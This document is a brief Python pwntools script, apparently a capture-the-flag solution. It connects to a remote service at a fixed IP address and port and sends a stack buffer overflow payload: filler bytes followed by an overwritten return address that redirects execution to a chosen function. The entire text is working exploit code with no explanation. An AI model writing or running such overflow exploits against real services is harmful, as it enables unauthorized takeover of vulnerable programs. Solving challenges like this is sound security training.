from pwn import *

payload = 'a' * 0x40 + 'a' * 8 + p64(0x4008b9)

r = remote('183.129.189.60', 10026)

r.recvuntil("Now let's begin")
r.sendline(payload)
print r.recv()
print r.recv()
